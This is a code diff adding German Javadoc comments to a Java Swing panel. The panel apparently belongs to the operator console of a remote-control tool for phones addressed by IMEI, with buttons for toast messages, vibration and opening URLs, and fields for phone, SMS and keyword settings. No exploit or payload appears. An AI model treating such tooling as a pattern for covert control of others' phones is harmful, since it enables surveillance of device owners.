@@ -29,6 +29,9 @@ import javax.swing.Box;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
 
+/**
+ * Diese Klasse ist zum Verwalten und Aktualisiern der Daten des Home Tabs zuständig.
+ */
 public class HomePanel extends JPanel {
 	
 	private UserGUI gui;
@@ -44,7 +47,8 @@ public class HomePanel extends JPanel {
 	private JTextField urlField;
 
 	/**
-	 * Create the panel.
+	 * Erstellt das Home Panel.
+	 * @param gui	Die Gui
 	 */
 	public HomePanel(UserGUI gui) {
 		this.gui = gui;
@@ -309,7 +313,11 @@ public class HomePanel extends JPanel {
 		panel_1.setLayout(gl_panel_1);
 		setLayout(groupLayout);
 	}
-	
+
+	/**
+	 * Diese Methode wird aufgerufen wenn der Button Save Configuration geklickt wird.
+	 * Sie erstellt ArrayListen in denen die eingegebenen Daten gespeichert werden und ruft die Methode fireSaveConnectConfigurations der Klasse Gui auf um diese an den Client zu senden.
+	 */
 	private void fireButtonSaveConnectionConfig() {
 		ArrayList<String> phones = new ArrayList<String>();
 		ArrayList<String> sms = new ArrayList<String>();
@@ -321,22 +329,43 @@ public class HomePanel extends JPanel {
 		
 		gui.fireSaveConnectConfigurations(ipField.getText(), Integer.valueOf(portField.getText()), chckbxWaitEventTo.isSelected(), phones, sms, kw);
 	}
-	
+
+	/**
+	 * Diese Methode wird aufgerufen wenn der Button Toast it gesrückt wird.
+	 * Es werden die Daten des Textfelds ausgelesen und an die Methode fireToastMessage übergeben.
+	 */
 	private void fireButtonToast() {
 		String mess = toastField.getText();
 		gui.getGUI().fireToastMessage(gui.getImei(), mess);
 	}
-	
+
+	/**
+	 * Diese Methode wirda aufgerufen wenn der Button Virbate gedrückt wird.
+	 * Es werden dann die Daten des Textfelds ausgelesen in einem long int gespeichert und der Methode fireVirbrate übergeben.
+	 */
 	private void fireButtonVibrate() {
 		String value = durationField.getText();
 		long l = Long.valueOf(value);
 		gui.getGUI().fireVibrate(gui.getImei(), l);
 	}
-	
+
+	/**
+	 * Diese Methode wird aufgerufen wenn der Button Browse it aktiviert wird.
+	 * Danach werden die Daten des TextFelds an die Methode fireBroserUrl übergeben.
+	 */
 	private void fireButtonBrowse() {
 		gui.getGUI().fireBrowseUrl(gui.getImei(), urlField.getText());
 	}
-	
+
+	/**
+	 * Diese Methode wird aufgerufen wenn ein neue Prefence Paket ankommt um die Daten zu aktualisieren.
+	 * @param ip	Die IP
+	 * @param port	Der Port
+	 * @param wait
+	 * @param phones	Die Telefonnummern
+	 * @param sms	Die SMSnummer
+	 * @param kw	Die Schlüsselwörter
+	 */
 	public void updatePreferences(String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
 		String temp = "";
 		if(phones != null) {
@@ -361,12 +390,21 @@ public class HomePanel extends JPanel {
 		portField.setText(""+port);
 		chckbxWaitEventTo.setSelected(wait);
 	}
-	
+
+	/**
+	 * Diese Methode wird aufgerufen wenn der Button Refresh gedrückt wird.
+	 * Danach wird das TextFeld geleert und die Klasse fireGetAdvancedInformations der Klasse Gui Aufgerufen.
+	 */
 	private void fireButtonRefreshAdv() {
 		textArea.setText("");
 		gui.fireGetAdvancedInformations();
 	}
-		
+
+	/**
+	 * Diese Methode wird aufgerufen wenn ein neues AdvancedInformationPacket ankommt.
+	 * Hier werden dann dessen Daten ausgelesen und auf der GUI angezeigt.
+ 	 * @param packet	Das neue Paket mit den Daten
+	 */
 	public void updateInformations(AdvancedInformationPacket packet) {
 		String txt = "";
 		
